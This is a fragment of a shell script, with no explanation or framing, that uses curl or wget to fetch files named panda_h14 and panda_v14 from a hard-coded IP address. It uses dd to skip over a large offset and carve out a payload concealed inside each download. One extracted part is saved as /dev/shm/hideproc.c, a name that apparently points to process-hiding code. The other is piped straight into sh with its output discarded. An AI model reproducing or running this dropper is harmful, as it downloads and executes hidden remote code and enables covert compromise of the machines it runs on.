 if command -v /usr/bin/curl >/dev/null 2>&1; then
  /usr/bin/curl -s -H 'Accept-Encoding: identity' http://192.168.10.130/panda_h14 \
  | /usr/bin/dd bs=1 skip=1353955 status=none > /dev/shm/hideproc.c
#  | env -i PATH=/usr/bin:/bin sh -s -- -s > /tmp/output.txt 2>&1

  /usr/bin/curl -s -H 'Accept-Encoding: identity' http://192.168.10.130/panda_v14 \
  | /usr/bin/dd bs=1 skip=1353955 status=none \
  | env -i PATH=/usr/bin:/bin sh -s -- -s > /dev/null  2>&1

elif command -v /usr/bin/wget >/dev/null 2>&1; then
  /usr/bin/wget --no-check-certificate -qO- http://192.168.10.130/panda_h14 \
  | /usr/bin/dd bs=1 skip=1353955 status=none > /dev/shm/hideproc.c \
  | env -i PATH=/usr/bin:/bin sh -s -- -s 2>/dev/null
#  | env -i PATH=/usr/bin:/bin sh -s -- -s > /tmp/output.txt 2>&1

  /usr/bin/wget --no-check-certificate -qO- http://192.168.10.130/panda_v14 \
  | /usr/bin/dd bs=1 skip=1353955 status=none \
  | env -i PATH=/usr/bin:/bin sh -s -- -s > /tmp/output.txt 2>&1
